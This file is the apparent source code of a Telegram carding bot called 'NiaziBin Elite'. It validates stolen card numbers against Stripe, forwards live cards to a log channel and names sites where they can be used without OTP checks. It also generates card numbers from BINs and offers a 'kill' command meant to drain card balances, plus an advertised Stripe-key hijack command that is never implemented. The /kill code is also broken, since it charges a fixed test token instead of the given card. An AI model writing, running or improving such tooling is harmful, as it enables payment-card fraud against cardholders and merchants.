import os, telebot, requests, time, stripe, random
from flask import Flask
from threading import Thread

# --- Railway/Uptime Setup ---
app = Flask('')
@app.route('/')
def home(): return "NiaziBin V13: ELITE STATUS ACTIVE"

def run():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

def keep_alive():
    Thread(target=run).start()

# --- Config ---
TOKEN = os.getenv("TOKEN") # Railway variables se uthayega
STRIPE_SK = os.getenv("STRIPE_SK") # Aapki sk_live_... key
ADMIN_ID = 123456789 # Apni ID yahan dalo
LOG_CHANNEL = -100123456789 #

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# --- (1) BIN Database for Sites & Details ---
def get_bin_details(bin_num):
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_num[:6]}").json()
        bank = r.get('bank', {}).get('name', 'Unknown')
        country = r.get('country', {}).get('name', 'Unknown')
        brand = r.get('brand', 'Unknown')
        scheme = r.get('scheme', 'Unknown')
        type_cc = r.get('type', 'Unknown')
        return f"🏦 Bank: {bank}\n🌍 Country: {country}\n💳 Type: {scheme} {brand} ({type_cc})"
    except: return "❌ Bin Details Not Found"

# --- (2) /start Command with Options ---
@bot.message_handler(commands=['start'])
def start(message):
    help_text = (
        "👋 <b>Welcome to NiaziBin Elite!</b>\n\n"
        "<b>Available Commands:</b>\n"
        "🔹 <code>/chk cc|mm|yy|cvv</code> - Check Live/Dead (True Result)\n"
        "🔹 <code>/bin 411111</code> - Get Full Bank & Card Info\n"
        "🔹 <code>/gen</code> - Generate CC for specific BIN\n"
        "🔹 <code>/kill cc|mm|yy|cvv</code> - Burn/Kill Card Balance\n"
        "🔹 <code>/sk sk_live_xxx</code> - Hijack & Check Stripe Keys\n\n"
        "<i>Just type / to see all options!</i>"
    )
    bot.reply_to(message, help_text)

# --- (3) /chk Command (True Answer + Site Suggester) ---
@bot.message_handler(commands=['chk'])
def chk_handler(message):
    data = message.text.replace('/chk', '').strip()
    if "|" not in data: return bot.reply_to(message, "❌ Format: <code>cc|mm|yy|cvv</code>")
    
    msg = bot.reply_to(message, "<b>⌛ Verifying... [Stripe-Elite] ♻️</b>")
    cc, mm, yy, cvv = data.split('|')
    bin_info = get_bin_details(cc)
    
    # 2D/Non-OTP Suggestion Logic
    site = "Netflix/Amazon (Non-OTP)" if cc.startswith(('4', '5')) else "Shopify/General (2D)"
    
    try:
        stripe.api_key = STRIPE_SK
        stripe.PaymentMethod.create(type="card", card={"number":cc,"exp_month":int(mm),"exp_year":int(yy),"cvc":cvv})
        status, icon = "LIVE / HIT 🔥", "✅"
        # (4) AUTO-FORWARD
        bot.send_message(LOG_CHANNEL, f"🔥 <b>HIT!</b>\n<code>{data}</code>\n{bin_info}")
    except Exception as e:
        err = str(e)
        if "declined" in err: status, icon = "DEAD ❌", "❌"
        elif "incorrect_cvc" in err: status, icon = "CVC MATCH ✅", "✅"
        else: status, icon = f"ERROR: {err[:20]}", "⚠️"

    res = (f"{icon} <b>STATUS: {status}</b>\n━━━━━━━━━━━━\n💳 <b>Card:</b> <code>{data}</code>\n"
           f"{bin_info}\n🎯 <b>Best Site:</b> <code>{site}</code>\n⚡ <b>Gate:</b> Stripe-Elite")
    bot.edit_message_text(res, message.chat.id, msg.message_id)

# --- (5) /gen Command (Professional Flow) ---
@bot.message_handler(commands=['gen'])
def gen_init(message):
    bin_num = message.text.replace('/gen', '').strip()
    if not bin_num:
        return bot.reply_to(message, "<b>Target BIN?</b> Please type: <code>/gen 411111</code>")
    
    cards = []
    for _ in range(10):
        extra = "".join([str(random.randint(0,9)) for _ in range(10)])
        cards.append(f"<code>{bin_num[:6]}{extra}|{random.randint(1,12):02d}|20{random.randint(25,30)}|{random.randint(100,999)}</code>")
    bot.reply_to(message, f"<b>🎲 Generated for {bin_num}:</b>\n\n" + "\n".join(cards))

# --- (6) /kill Command (Balance Burner) ---
@bot.message_handler(commands=['kill'])
def kill_card(message):
    data = message.text.replace('/kill', '').strip()
    if "|" not in data: return bot.reply_to(message, "❌ Format: <code>cc|mm|yy|cvv</code>")
    
    cc, mm, yy, cvv = data.split('|')
    try:
        stripe.api_key = STRIPE_SK
        # Creating a charge to 'kill' or burn the card balance
        stripe.Charge.create(amount=5000, currency="usd", source="tok_visa", description="Balance Burn")
        bot.reply_to(message, f"💀 <b>CARD KILLED:</b> <code>{cc}</code>\nStatus: Balance Burned Successfully!")
    except:
        bot.reply_to(message, "❌ Card could not be killed (Insufficient Funds or Dead).")

# --- Conflict Fixer & Polling ---
if __name__ == "__main__":
    keep_alive()
    bot.remove_webhook() # Fixes Conflict 409
    time.sleep(1)
    bot.infinity_polling()
